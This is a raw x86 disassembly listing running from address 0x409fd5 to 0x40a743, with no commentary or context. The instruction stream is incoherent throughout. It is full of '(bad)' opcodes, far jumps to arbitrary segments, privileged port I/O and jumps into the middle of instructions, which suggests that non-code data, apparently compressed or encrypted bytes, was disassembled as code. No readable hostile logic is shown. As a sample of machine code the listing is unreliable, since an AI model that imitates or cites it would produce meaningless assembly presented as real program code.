  409fd5:	fimul  DWORD PTR [ebp-0x19]
  409fd8:	and    DWORD PTR [ecx],edx
  409fda:	jmp    0xf468:0x55db647c
  409fe1:	sub    al,0x74
  409fe3:	jle    0x409fc4
  409fe5:	jl     0x409fb1
  409fe7:	jb     0x409f76
  409fe9:	xchg   ebx,eax
  409fea:	mov    al,ds:0x1c59c61c
  409fef:	outs   dx,DWORD PTR ds:[esi]
  409ff0:	ret    
  409ff1:	call   0x55a0:0x1275cb50
  409ff8:	scas   al,BYTE PTR es:[edi]
  409ff9:	bound  edi,QWORD PTR ds:0xbfc6717e
  409fff:	adc    DWORD PTR [edi+ecx*1],0xffffffa3
  40a003:	stc    
  40a004:	mov    al,0xc7
  40a006:	lock sbb ebx,esi
  40a009:	es es cmp eax,0x6911bf2b
  40a010:	mov    edi,0xdd0bb76d
  40a015:	rcr    DWORD PTR [esi-0x19c2daaa],1
  40a01b:	int3   
  40a01c:	add    DWORD PTR [ebx-0x1],ebp
  40a01f:	ja     0x40a00d
  40a021:	inc    esp
  40a022:	leave  
  40a023:	jmp    0x40a027
  40a025:	daa    
  40a026:	mov    eax,0x4842efe4
  40a02b:	adc    edi,ebp
  40a02d:	add    eax,0x7c6fed9
  40a032:	scas   eax,DWORD PTR es:[edi]
  40a033:	mov    ch,0x5e
  40a035:	mov    ds:0xc5e8d9a4,al
  40a03a:	jmp    0x14a8e70c
  40a03f:	mov    ah,0x80
  40a041:	les    eax,FWORD PTR [eax-0x664d0052]
  40a047:	rol    DWORD PTR [edx+edx*2-0x1a],cl
  40a04b:	(bad)  
  40a04c:	push   ds
  40a04d:	push   0x63
  40a04f:	and    al,0x7f
  40a051:	jns    0x40a073
  40a053:	out    dx,eax
  40a054:	jp     0x40a0b9
  40a056:	cmp    DWORD PTR ds:0x9c53e3e,edx
  40a05c:	and    esi,ecx
  40a05e:	(bad)  
  40a05f:	rol    DWORD PTR [esp+edx*1+0x7a581df0],cl
  40a066:	sti    
  40a067:	sahf   
  40a068:	rcr    DWORD PTR ds:0x57a7ff04,cl
  40a06e:	mov    dh,0x1b
  40a070:	jg     0x40a05d
  40a072:	jnp    0x40a071
  40a074:	jle    0x40a022
  40a076:	cwde   
  40a077:	and    BYTE PTR [ebx-0x946ab95],0xe9
  40a07e:	in     eax,dx
  40a07f:	es push ecx
  40a081:	pushf  
  40a082:	mov    ?,eax
  40a084:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a085:	or     ebx,esp
  40a087:	test   ch,al
  40a089:	mov    ah,bl
  40a08b:	jbe    0x40a059
  40a08d:	mov    dl,0xc7
  40a08f:	and    al,0xea
  40a091:	inc    ebp
  40a092:	dec    edi
  40a093:	lods   al,BYTE PTR ds:[esi]
  40a094:	adc    ebp,edx
  40a096:	mov    edx,0x511b77ee
  40a09b:	popa   
  40a09c:	push   0x6c84ed9a
  40a0a1:	add    edi,DWORD PTR [esi]
  40a0a3:	loope  0x40a104
  40a0a5:	mov    fs,WORD PTR [ebp-0x3d]
  40a0a8:	ds ret 0x2784
  40a0ac:	data16 jno 0x40a0e0
  40a0af:	and    ah,BYTE PTR [esi+eax*1]
  40a0b2:	call   0x42d9a6e2
  40a0b7:	in     eax,dx
  40a0b8:	mov    al,0x2
  40a0ba:	in     al,dx
  40a0bb:	or     al,0x64
  40a0bd:	lea    ebx,[edx-0x53219917]
  40a0c3:	jp     0x40a0ac
  40a0c5:	xchg   BYTE PTR [ebp-0x3b],bl
  40a0c8:	call   FWORD PTR ds:0x19abe0e6
  40a0ce:	sub    eax,0x4247181f
  40a0d3:	xor    eax,0x3c6b72ff
  40a0d8:	pop    esi
  40a0d9:	jg     0x40a12f
  40a0db:	xchg   esi,eax
  40a0dc:	jns    0x40a0fb
  40a0de:	aam    0xe7
  40a0e0:	mov    edi,0x4520993e
  40a0e5:	and    ecx,DWORD PTR [eax-0x78]
  40a0e8:	and    ebx,DWORD PTR [edx]
  40a0ea:	jo     0x40a0ce
  40a0ec:	inc    esp
  40a0ed:	inc    esp
  40a0ee:	aam    0x5c
  40a0f0:	push   es
  40a0f1:	cmp    eax,0x98d7c8e9
  40a0f6:	int    0x81
  40a0f8:	iret   
  40a0f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0fa:	jp     0x40a0e4
  40a0fc:	dec    ebp
  40a0fd:	cmp    eax,0x16
  40a100:	nop
  40a101:	mov    ebx,0xf9aa171c
  40a106:	ror    BYTE PTR [esi+0x4d06ed9c],cl
  40a10c:	icebp  
  40a10d:	adc    esp,DWORD PTR [esi]
  40a10f:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  40a111:	inc    esp
  40a113:	aas    
  40a114:	mov    esi,0xb41fc0fe
  40a119:	cmp    ch,bh
  40a11b:	rol    dl,cl
  40a11d:	daa    
  40a11e:	jecxz  0x40a0b5
  40a120:	out    0x7c,eax
  40a122:	leave  
  40a123:	shl    BYTE PTR [eax-0x1f72a771],1
  40a129:	pop    ebp
  40a12a:	mov    ch,0xaa
  40a12c:	popf   
  40a12d:	jle    0x40a126
  40a12f:	jge    0x40a0e1
  40a131:	popf   
  40a132:	xor    esp,0xffffffd0
  40a135:	sbb    eax,0x58b69190
  40a13a:	pmulhuw mm6,QWORD PTR ss:[esi+0x5f]
  40a13f:	add    DWORD PTR [edi+0x7b724afd],edx
  40a145:	jle    0x40a0e2
  40a147:	jbe    0x40a12d
  40a149:	adc    esp,esp
  40a14b:	das    
  40a14c:	mov    eax,DWORD PTR [eax]
  40a14e:	scas   eax,DWORD PTR es:[edi]
  40a14f:	xchg   edi,eax
  40a150:	mov    eax,ds:0xcb6de2d3
  40a155:	mov    ecx,0x3a8505ab
  40a15a:	test   DWORD PTR [ebx],edi
  40a15c:	imul   ecx,edi,0x8fc8df64
  40a162:	inc    esi
  40a163:	mov    ds:0xd098e72f,al
  40a168:	add    ecx,edi
  40a16a:	push   ss
  40a16b:	es je  0x40a0fb
  40a16e:	daa    
  40a16f:	sub    eax,0xea21fa5f
  40a174:	(bad)  
  40a175:	jne    0x40a17e
  40a177:	xlat   BYTE PTR ds:[ebx]
  40a178:	mov    al,ds:0x656e5e99
  40a17d:	xchg   dh,cl
  40a17f:	ficomp DWORD PTR [edx]
  40a181:	jnp    0x40a1f8
  40a183:	scas   al,BYTE PTR es:[edi]
  40a184:	jae    0x40a122
  40a186:	fwait
  40a187:	jmp    0xcc877d34
  40a18c:	xchg   BYTE PTR [esi],dl
  40a18e:	add    al,0x3a
  40a190:	or     eax,0xc73b03a5
  40a195:	push   esi
  40a196:	push   ss
  40a197:	jno    0x40a1c5
  40a199:	fild   DWORD PTR [eax]
  40a19b:	es xchg edi,eax
  40a19d:	in     al,dx
  40a19e:	imul   edi,DWORD PTR [eax+0x23526848],0x64
  40a1a5:	jecxz  0x40a201
  40a1a7:	out    dx,al
  40a1a8:	xchg   esi,eax
  40a1a9:	call   0x47d86bc7
  40a1ae:	add    eax,0xed66fad0
  40a1b3:	fmul   QWORD PTR [edi]
  40a1b5:	push   ebx
  40a1b6:	inc    edx
  40a1b7:	xor    eax,0x15fa5234
  40a1bc:	jo     0x40a19a
  40a1be:	loope  0x40a15b
  40a1c0:	out    dx,eax
  40a1c1:	mov    ebx,0x2e6d7387
  40a1c6:	mov    cl,0x26
  40a1c8:	jb     0x40a226
  40a1ca:	push   edx
  40a1cb:	daa    
  40a1cc:	dec    ebx
  40a1cd:	ret    
  40a1ce:	in     eax,dx
  40a1cf:	cmp    ah,BYTE PTR [ebx-0x5c]
  40a1d2:	retf   0x2c53
  40a1d5:	pop    ecx
  40a1d6:	stos   BYTE PTR es:[edi],al
  40a1d7:	mov    esi,0xc42a0ef5
  40a1dc:	push   eax
  40a1dd:	inc    ebx
  40a1de:	test   BYTE PTR [edi],cl
  40a1e0:	adc    BYTE PTR [edi],al
  40a1e2:	cli    
  40a1e3:	or     ch,bl
  40a1e5:	adc    DWORD PTR [eax-0x39],0xffffffaf
  40a1e9:	mov    ebp,0xeab879eb
  40a1ee:	inc    esi
  40a1ef:	mov    bh,0x3f
  40a1f1:	push   esi
  40a1f2:	mov    edx,DWORD PTR [edi]
  40a1f4:	push   ss
  40a1f5:	pop    ebp
  40a1f6:	or     DWORD PTR [esi],0x12
  40a1f9:	pop    es
  40a1fa:	out    0x57,al
  40a1fc:	sbb    al,0x83
  40a1fe:	sub    edx,edi
  40a200:	inc    eax
  40a201:	mov    cl,0x21
  40a203:	or     BYTE PTR [edx-0x3f],cl
  40a206:	jne    0x40a227
  40a208:	pop    edx
  40a209:	lods   al,BYTE PTR ds:[esi]
  40a20a:	jmp    0x9214518e
  40a20f:	xchg   ecx,eax
  40a210:	in     eax,dx
  40a211:	pop    edx
  40a212:	sbb    eax,0xa8e80df9
  40a217:	dec    edx
  40a218:	nop
  40a219:	xchg   ebp,eax
  40a21a:	inc    ebp
  40a21b:	or     DWORD PTR [eax-0x72a5dd9a],0x8c597cbc
  40a225:	or     ecx,DWORD PTR [esi-0x2c]
  40a228:	sub    ebp,esi
  40a22a:	push   ecx
  40a22b:	call   0x3cee:0x55767b1d
  40a232:	loopne 0x40a27b
  40a234:	(bad)  
  40a235:	fcmovb st,st(6)
  40a237:	add    DWORD PTR [esi+0x1e],ecx
  40a23a:	lods   eax,DWORD PTR ds:[esi]
  40a23b:	ins    DWORD PTR es:[edi],dx
  40a23c:	test   DWORD PTR cs:[edx-0x9],esp
  40a240:	arpl   WORD PTR [ebx-0x39],bx
  40a243:	leave  
  40a244:	xor    edi,DWORD PTR [edi]
  40a246:	loopne 0x40a219
  40a248:	jns    0x40a210
  40a24a:	daa    
  40a24b:	cmp    DWORD PTR [ecx],ebp
  40a24d:	xor    DWORD PTR [edx],esp
  40a24f:	in     al,dx
  40a250:	rcl    BYTE PTR [ebx],0x6e
  40a253:	ret    
  40a254:	mov    ah,0x95
  40a256:	mov    bh,BYTE PTR [esi-0x5d81d715]
  40a25c:	jecxz  0x40a2b7
  40a25e:	pop    ebx
  40a25f:	jmp    0x3003:0x85ace489
  40a266:	repz in eax,dx
  40a268:	pop    ss
  40a269:	push   eax
  40a26a:	mov    esi,0xc392bade
  40a26f:	add    eax,0x6bca1e6e
  40a274:	sub    eax,0x46d98145
  40a279:	and    ebx,DWORD PTR [eax+0x11bafa92]
  40a27f:	nop
  40a280:	mov    esi,0xa1e85240
  40a285:	sub    eax,0x311a168d
  40a28a:	xor    al,0xda
  40a28c:	pop    es
  40a28d:	mov    bl,0x41
  40a28f:	xor    al,0xd7
  40a291:	hlt    
  40a292:	outs   dx,DWORD PTR ds:[esi]
  40a293:	pushf  
  40a294:	cmp    ebx,esi
  40a296:	add    edx,DWORD PTR [ebx]
  40a298:	shl    DWORD PTR [edx],cl
  40a29a:	mov    bh,0x28
  40a29c:	mov    DWORD PTR [ebx],ebp
  40a29e:	dec    esp
  40a29f:	push   esp
  40a2a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2a1:	mov    bl,0xd5
  40a2a3:	mov    bl,0xa7
  40a2a5:	mov    esp,0xe00422b1
  40a2aa:	or     BYTE PTR [eax],bh
  40a2ac:	sbb    ch,cl
  40a2ae:	sti    
  40a2af:	inc    esi
  40a2b0:	js     0x40a2bc
  40a2b2:	xchg   esp,eax
  40a2b3:	sub    ebx,edi
  40a2b5:	mov    ebx,0xe48884c7
  40a2ba:	fcomp  QWORD PTR [ebp+0x1a]
  40a2bd:	es push ebx
  40a2bf:	jmp    DWORD PTR [eax]
  40a2c1:	in     al,dx
  40a2c2:	sbb    ecx,ecx
  40a2c4:	xor    esp,DWORD PTR [edi-0x16]
  40a2c7:	les    esi,FWORD PTR [esi+0x24]
  40a2ca:	(bad)  
  40a2cb:	imul   edx,DWORD PTR [ebx],0x8f160dd
  40a2d1:	mov    ebp,0xf14f150d
  40a2d6:	mov    ds:0x187419f6,al
  40a2db:	mov    ah,0x79
  40a2dd:	fidivr WORD PTR ds:0x3b17b309
  40a2e3:	xchg   esp,eax
  40a2e4:	mov    dl,0xbd
  40a2e6:	bswap  esi
  40a2e8:	aam    0xbb
  40a2ea:	cmp    DWORD PTR [ebx-0x35dee1f4],ebx
  40a2f0:	aam    0x5c
  40a2f2:	inc    ecx
  40a2f3:	cwde   
  40a2f4:	or     BYTE PTR [edi],cl
  40a2f6:	ins    BYTE PTR es:[edi],dx
  40a2f7:	mov    ebx,0x5804c048
  40a2fc:	arpl   WORD PTR [ebp+edx*4-0x17],dx
  40a300:	test   BYTE PTR [esi-0x37f56c56],cl
  40a306:	add    al,0xda
  40a308:	mov    eax,ds:0xddfc650
  40a30d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a30e:	loopne 0x40a31f
  40a310:	push   eax
  40a311:	and    BYTE PTR [edi+0x63b58c1e],dh
  40a317:	lea    edi,[ecx-0x6bfdc431]
  40a31d:	cli    
  40a31e:	iret   
  40a31f:	call   0x9da3c1f6
  40a324:	popf   
  40a325:	jbe    0x40a2f8
  40a327:	xor    eax,0x6e76492c
  40a32c:	mov    al,0xad
  40a32e:	jne    0x40a2fe
  40a330:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a331:	ret    0xc4a7
  40a334:	mov    edx,0x1b407485
  40a339:	outs   dx,DWORD PTR ds:[esi]
  40a33a:	into   
  40a33b:	ins    BYTE PTR es:[edi],dx
  40a33c:	inc    esi
  40a33d:	push   ebx
  40a33e:	add    DWORD PTR [ebp-0x30],eax
  40a341:	sub    DWORD PTR [esi],ebp
  40a343:	(bad)  
  40a344:	aas    
  40a345:	iret   
  40a346:	xor    eax,0x14f98783
  40a34b:	popf   
  40a34c:	lahf   
  40a34d:	mov    ds:0x2d11e1c5,al
  40a352:	gs push 0x1b5e2d96
  40a358:	js     0x40a36b
  40a35a:	inc    esi
  40a35b:	cwde   
  40a35c:	mov    BYTE PTR ds:0xa8c2b13d,dh
  40a362:	lahf   
  40a363:	stc    
  40a364:	pop    ebx
  40a365:	push   0xffffff8b
  40a367:	xlat   BYTE PTR ds:[ebx]
  40a368:	mov    ecx,0x3efce192
  40a36d:	retf   
  40a36e:	jbe    0x40a3c9
  40a370:	dec    ecx
  40a371:	sti    
  40a372:	cmp    DWORD PTR [ebp-0x35f2cace],esi
  40a378:	or     eax,0x90ca432c
  40a37d:	pushf  
  40a37e:	mov    BYTE PTR [edx],dh
  40a380:	fs pop ds
  40a382:	shl    BYTE PTR [edx-0x40],0xf6
  40a386:	and    DWORD PTR [eax],ebp
  40a388:	pop    edi
  40a389:	in     eax,dx
  40a38a:	mov    eax,0x573b37b1
  40a38f:	mov    esp,0xf6c0d3f
  40a394:	and    BYTE PTR [ecx+0x37],ch
  40a397:	imul   edi,ebp,0x366fbd95
  40a39d:	dec    ecx
  40a39e:	push   cs
  40a39f:	pusha  
  40a3a0:	scas   eax,DWORD PTR es:[edi]
  40a3a1:	add    BYTE PTR [ebx-0x29],cl
  40a3a4:	sbb    eax,DWORD PTR [esp+ecx*4]
  40a3a7:	jmp    0xf25:0x290bfade
  40a3ae:	jmp    0x40a39a
  40a3b0:	xchg   ebx,eax
  40a3b1:	inc    edi
  40a3b2:	dec    ebx
  40a3b3:	sbb    al,0x39
  40a3b5:	pop    ecx
  40a3b6:	push   DWORD PTR [esi-0x77]
  40a3b9:	and    BYTE PTR [eax*1-0x5699fb48],bh
  40a3c0:	mov    BYTE PTR [edx-0x11],bh
  40a3c3:	pcmpgtd mm1,QWORD PTR [edx]
  40a3c6:	fstp   QWORD PTR [edi+0x7259c3b6]
  40a3cc:	fisub  WORD PTR [eax]
  40a3ce:	enter  0xfcf1,0xc8
  40a3d2:	cmp    DWORD PTR [edx+0xd],eax
  40a3d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3d6:	lock (bad) 
  40a3d8:	bound  esp,QWORD PTR [ebx-0x6f250749]
  40a3de:	adc    eax,0x4dc23ed9
  40a3e3:	enter  0x47da,0xd1
  40a3e7:	mov    bh,0x1f
  40a3e9:	sub    al,0xac
  40a3eb:	fs fwait
  40a3ed:	sar    DWORD PTR ds:0x4037c921,1
  40a3f4:	imul   edx,DWORD PTR [esi],0x35
  40a3f7:	mov    ebp,eax
  40a3f9:	xchg   DWORD PTR [eax+eiz*1+0x54],esi
  40a3fd:	retf   
  40a3fe:	push   ebx
  40a3ff:	mov    edx,0x44c56c36
  40a404:	inc    edx
  40a405:	pop    ds
  40a406:	dec    esp
  40a407:	rol    BYTE PTR [edx],0x21
  40a40a:	loopne 0x40a3fe
  40a40c:	xchg   edi,eax
  40a40d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a40e:	mov    BYTE PTR [eax+ecx*1],dh
  40a411:	adc    BYTE PTR [ebx-0x7d],dh
  40a414:	lahf   
  40a415:	xor    eax,0x4fd2772d
  40a41a:	and    al,0x71
  40a41c:	xchg   esi,eax
  40a41d:	mov    ecx,0xcadec01b
  40a422:	setbe  BYTE PTR [eax+0x53]
  40a426:	inc    ebp
  40a427:	ins    DWORD PTR es:[edi],dx
  40a428:	and    bl,bl
  40a42a:	push   ecx
  40a42b:	push   edi
  40a42c:	lods   al,BYTE PTR ds:[esi]
  40a42d:	add    BYTE PTR [edi-0x63],0x60
  40a431:	test   eax,0x49917de9
  40a436:	jns    0x40a4a6
  40a438:	xor    BYTE PTR [ebx+0x56540559],bl
  40a43e:	aas    
  40a43f:	pop    ss
  40a440:	add    BYTE PTR [ebx-0x5d],ah
  40a443:	mov    dh,dl
  40a445:	jno    0x40a3e0
  40a447:	addr16 icebp 
  40a449:	or     BYTE PTR [ecx-0x5e],ch
  40a44c:	xchg   edi,eax
  40a44d:	ja     0x40a3eb
  40a44f:	rol    esi,0x59
  40a452:	lds    edi,FWORD PTR [esi+0x13]
  40a455:	mov    eax,0x819ed585
  40a45a:	mov    WORD PTR [ebp+0x2b],cs
  40a45d:	rcl    BYTE PTR [ecx+eax*2],0xeb
  40a461:	mov    cl,0xaf
  40a463:	and    al,0x35
  40a465:	mov    al,0x9e
  40a467:	js     0x40a451
  40a469:	inc    edx
  40a46a:	lods   eax,DWORD PTR ds:[esi]
  40a46b:	cld    
  40a46c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a46d:	fsubr  QWORD PTR [ecx+0x4adfe70c]
  40a473:	jo     0x40a3f6
  40a475:	jmp    0x40a4c6
  40a477:	pop    eax
  40a478:	mov    ch,0xa6
  40a47a:	add    al,0xd
  40a47c:	(bad)  
  40a47d:	aad    0xbb
  40a47f:	retf   
  40a480:	sbb    edx,DWORD PTR [esi]
  40a482:	in     eax,dx
  40a483:	lods   al,BYTE PTR ds:[esi]
  40a484:	inc    ecx
  40a485:	xor    BYTE PTR [edi-0x17],ch
  40a488:	xchg   DWORD PTR [eax],ecx
  40a48a:	pop    ecx
  40a48b:	mov    gs,edx
  40a48d:	cmp    al,0x7f
  40a48f:	jns    0x40a424
  40a491:	jb     0x40a4ab
  40a493:	jbe    0x40a457
  40a495:	bound  eax,QWORD PTR [edx-0x41]
  40a498:	inc    ebx
  40a499:	mov    bh,0xfa
  40a49b:	inc    ebx
  40a49c:	push   ebp
  40a49d:	sti    
  40a49e:	ja     0x40a4d0
  40a4a0:	push   0xe4f965da
  40a4a5:	in     al,dx
  40a4a6:	mov    edi,0x9d75c07f
  40a4ab:	mov    esp,0x368e1fd2
  40a4b0:	ror    BYTE PTR [ecx],cl
  40a4b2:	pop    ecx
  40a4b3:	mov    ebx,0x5595d0a3
  40a4b8:	or     esp,DWORD PTR [ecx+esi*1-0x35]
  40a4bc:	mov    edx,0x2a0d6b54
  40a4c1:	imul   ebx,DWORD PTR [edx],0x9678fa67
  40a4c7:	adc    BYTE PTR [edx+0x2d],dl
  40a4ca:	inc    DWORD PTR [ecx+ecx*2-0x66]
  40a4ce:	(bad)  
  40a4d0:	adc    ecx,edi
  40a4d2:	(bad)  
  40a4d3:	jmp    0x40a4e8
  40a4d5:	lahf   
  40a4d6:	mov    ds:0x27526eb5,eax
  40a4db:	gs (bad) 
  40a4dd:	xor    BYTE PTR [esi+0x3217061],al
  40a4e3:	daa    
  40a4e4:	imul   BYTE PTR [ebx+0x3f482bf9]
  40a4ea:	dec    edi
  40a4eb:	dec    eax
  40a4ec:	add    al,0xc3
  40a4ee:	js     0x47c4d1dc
  40a4f4:	loope  0x40a4e1
  40a4f6:	outs   dx,DWORD PTR ds:[esi]
  40a4f7:	add    ch,BYTE PTR [edi-0x31cd733c]
  40a4fd:	sbb    edx,ebx
  40a4ff:	mov    ecx,DWORD PTR [ebx]
  40a501:	in     eax,dx
  40a502:	adc    al,0xaa
  40a504:	loop   0x40a4be
  40a506:	cli    
  40a507:	outs   dx,DWORD PTR ds:[esi]
  40a508:	mul    BYTE PTR [ecx+0x39]
  40a50b:	inc    esi
  40a50c:	mov    DWORD PTR [ebx],ebx
  40a50e:	sti    
  40a50f:	pop    ds
  40a510:	mov    bl,0x33
  40a512:	adc    eax,0xaa1e9dea
  40a517:	bound  esp,QWORD PTR [edi-0x300b3787]
  40a51d:	xchg   edx,eax
  40a51e:	inc    eax
  40a51f:	and    bl,dl
  40a521:	adc    DWORD PTR ds:0xc21b1c71,esp
  40a527:	(bad)
  40a52a:	lock xchg bh,ch
  40a52d:	pushf  
  40a52e:	ror    BYTE PTR [ebp+0x61],cl
  40a531:	and    ebp,eax
  40a533:	xor    ebp,ebx
  40a535:	lahf   
  40a536:	xor    DWORD PTR [edi-0x41982584],ebp
  40a53c:	and    DWORD PTR [edi-0x7db7e1a5],esp
  40a542:	mov    BYTE PTR [ecx+0x27],0x48
  40a546:	or     esi,DWORD PTR [ebx+edx*1]
  40a549:	ds stos DWORD PTR es:[di],eax
  40a54c:	stos   DWORD PTR es:[edi],eax
  40a54d:	xchg   DWORD PTR [ecx-0x789c5f34],edx
  40a553:	push   ecx
  40a554:	pop    ds
  40a555:	and    ebx,ebp
  40a557:	lds    esi,FWORD PTR [ebp-0x1d]
  40a55a:	push   ecx
  40a55b:	jb     0x40a599
  40a55d:	fild   QWORD PTR [ebp-0xb231ab1]
  40a563:	and    ecx,DWORD PTR [edi-0x62b48c57]
  40a569:	in     al,0x73
  40a56b:	into   
  40a56c:	(bad)  
  40a56d:	stos   BYTE PTR es:[edi],al
  40a56e:	hlt    
  40a56f:	dec    esi
  40a570:	inc    eax
  40a571:	push   ebx
  40a572:	push   ecx
  40a573:	push   ss
  40a574:	cmp    eax,0x4d9bcddc
  40a579:	enter  0x8481,0x74
  40a57d:	retf   0x2721
  40a580:	leave  
  40a581:	mov    BYTE PTR [esi+0x22],dl
  40a584:	jecxz  0x40a52f
  40a586:	cmp    al,0x72
  40a588:	cdq    
  40a589:	mov    eax,ds:0x156c1ab8
  40a58e:	xlat   BYTE PTR ds:[ebx]
  40a58f:	dec    edx
  40a590:	add    ebx,DWORD PTR [eax-0x46c44a9]
  40a596:	sbb    al,al
  40a598:	imul   BYTE PTR [ecx-0x3768cac9]
  40a59e:	jmp    0x749c:0xefd39274
  40a5a5:	cdq    
  40a5a6:	aad    0x39
  40a5a8:	retf   
  40a5a9:	leave  
  40a5aa:	test   eax,0xc8c2cdd
  40a5af:	cwde   
  40a5b0:	mov    ds:0xa2c52040,al
  40a5b5:	sbb    eax,0xfd896509
  40a5ba:	aas    
  40a5bb:	leave  
  40a5bc:	(bad)  
  40a5bd:	adc    ebp,0xffffff9f
  40a5c0:	(bad)  
  40a5c2:	cli    
  40a5c3:	mov    al,0xe4
  40a5c5:	push   ebp
  40a5c6:	lods   eax,DWORD PTR ds:[esi]
  40a5c7:	scas   eax,DWORD PTR es:[edi]
  40a5c8:	out    0x70,eax
  40a5ca:	sub    eax,0x5b314372
  40a5cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5d0:	mov    ecx,DWORD PTR ds:0xc823cf35
  40a5d6:	dec    edi
  40a5d7:	inc    ecx
  40a5d8:	or     eax,0x855ee55e
  40a5dd:	mov    ebp,0x9dd6b2d6
  40a5e2:	xlat   BYTE PTR ds:[ebx]
  40a5e3:	dec    esi
  40a5e4:	add    BYTE PTR [ebx],ch
  40a5e6:	jne    0x40a59e
  40a5e8:	jecxz  0x40a581
  40a5ea:	push   ebp
  40a5eb:	lods   eax,DWORD PTR ds:[esi]
  40a5ec:	sbb    BYTE PTR [edx],bh
  40a5ee:	adc    DWORD PTR [esi+ebx*1+0x4439642a],edi
  40a5f5:	pop    ebp
  40a5f6:	ins    DWORD PTR es:[edi],dx
  40a5f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5f8:	add    eax,0x70268013
  40a5fd:	mov    ebx,0x42ccd773
  40a602:	xchg   ecx,eax
  40a603:	aam    0x41
  40a605:	ins    BYTE PTR es:[edi],dx
  40a606:	and    BYTE PTR [ebp+eiz*1+0x58586e33],ah
  40a60d:	push   ebp
  40a60e:	jns    0x40a635
  40a610:	frstor [ebx]
  40a612:	jle    0x40a647
  40a614:	mov    bh,0x72
  40a616:	dec    edi
  40a617:	lahf   
  40a618:	mov    eax,esi
  40a61a:	jl     0x40a5a7
  40a61c:	stos   DWORD PTR es:[edi],eax
  40a61d:	cmp    BYTE PTR [edi],ch
  40a61f:	cdq    
  40a620:	jae    0x40a5a3
  40a622:	pop    esi
  40a623:	adc    al,0xe8
  40a625:	in     al,0x4e
  40a627:	and    ecx,DWORD PTR [edx+0x59c8fa42]
  40a62d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a62e:	sar    DWORD PTR [ebp-0x21e8322e],0x75
  40a635:	sub    BYTE PTR ds:0x5ca977c3,al
  40a63b:	clc    
  40a63c:	and    eax,0xd2078608
  40a641:	xor    BYTE PTR [edx-0x32041913],bl
  40a647:	clc    
  40a648:	xor    ch,BYTE PTR [edx+eax*4+0x78]
  40a64c:	jae    0x40a5e1
  40a64e:	sub    eax,0x2091eff7
  40a653:	repnz inc edi
  40a655:	mov    bl,0xf0
  40a657:	iret   
  40a658:	pusha  
  40a659:	test   al,0xd2
  40a65b:	in     al,dx
  40a65c:	cmp    al,BYTE PTR [edx+ebp*1+0x30]
  40a660:	sbb    al,0x3e
  40a662:	add    eax,0x98d321c4
  40a667:	mov    ss,WORD PTR [edx-0x2]
  40a66a:	lds    edi,FWORD PTR [ecx]
  40a66c:	sub    al,0xcc
  40a66e:	xor    BYTE PTR [esi],dl
  40a670:	mov    al,ds:0xc84fe1b7
  40a675:	push   eax
  40a676:	sbb    eax,0x94193037
  40a67b:	push   ecx
  40a67c:	shr    DWORD PTR [eax],0xc5
  40a67f:	inc    eax
  40a680:	mov    eax,ds:0xe88f90db
  40a685:	aas    
  40a686:	outs   dx,BYTE PTR ds:[esi]
  40a687:	jns    0x40a699
  40a689:	test   al,0x68
  40a68b:	icebp  
  40a68c:	int    0x44
  40a68e:	or     al,BYTE PTR [eax]
  40a690:	xor    BYTE PTR [ebx-0x15],ah
  40a693:	test   DWORD PTR ds:0x2ae94a64,eax
  40a699:	or     BYTE PTR [ebx],bl
  40a69b:	call   DWORD PTR [ebx-0x35d5691d]
  40a6a1:	mov    edi,0xcab2ede5
  40a6a6:	addr16 or al,0x7c
  40a6a9:	inc    eax
  40a6aa:	out    0x9f,al
  40a6ac:	sahf   
  40a6ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6ae:	sbb    eax,0xa5807bc1
  40a6b3:	inc    esp
  40a6b4:	xchg   esp,eax
  40a6b5:	jge    0x40a71f
  40a6b7:	pop    ds
  40a6b8:	sbb    bh,0x84
  40a6bb:	push   eax
  40a6bc:	mov    al,0x2f
  40a6be:	scas   eax,DWORD PTR es:[edi]
  40a6bf:	mov    ds:0xe1de83f6,al
  40a6c4:	and    BYTE PTR [ecx-0x3a3b40fb],ah
  40a6ca:	jbe    0x40a64f
  40a6cc:	lds    ebx,FWORD PTR [ebx]
  40a6ce:	adc    eax,0xd5d28602
  40a6d3:	mov    eax,0x5dfa0eba
  40a6d8:	pop    es
  40a6d9:	mov    ds:0x926b4128,eax
  40a6de:	pop    edi
  40a6df:	push   es
  40a6e0:	out    dx,al
  40a6e1:	out    0x77,al
  40a6e3:	xor    esi,DWORD PTR [eax]
  40a6e5:	loope  0x40a74b
  40a6e7:	push   ds
  40a6e8:	ret    0xf623
  40a6eb:	test   al,0x96
  40a6ed:	sbb    eax,0x54b99d87
  40a6f2:	add    dh,bl
  40a6f4:	jle    0x40a69e
  40a6f6:	lea    di,[edx-0x17eaafa2]
  40a6fd:	cmp    al,0xc0
  40a6ff:	and    esp,edx
  40a701:	ins    BYTE PTR es:[edi],dx
  40a702:	mov    ecx,0x4aa67ddf
  40a707:	dec    ebp
  40a708:	add    ebx,esi
  40a70a:	or     dh,ah
  40a70c:	jne    0x40a73e
  40a70e:	pop    edi
  40a70f:	fisubr DWORD PTR [edi+edi*8]
  40a712:	dec    ebx
  40a713:	(bad)  
  40a714:	lea    esi,[edx-0x2c]
  40a717:	fwait
  40a718:	test   eax,0xab495fec
  40a71d:	xor    BYTE PTR [edi+0xf7fd1be],al
  40a723:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a724:	and    esp,DWORD PTR [edx+0x7ec88a26]
  40a72a:	mov    eax,0xe5decc59
  40a72f:	popa   
  40a730:	fmul   DWORD PTR [bx+si]
  40a733:	ss test al,0xba
  40a736:	outs   dx,DWORD PTR ds:[esi]
  40a737:	push   cs
  40a738:	xchg   edi,eax
  40a739:	push   esi
  40a73a:	ins    DWORD PTR es:[edi],dx
  40a73b:	out    dx,al
  40a73c:	pop    ss
  40a73d:	xchg   edi,eax
  40a73e:	js     0x40a78d
  40a740:	bound  ebx,QWORD PTR [edx+0xe]
  40a743:	push   edi
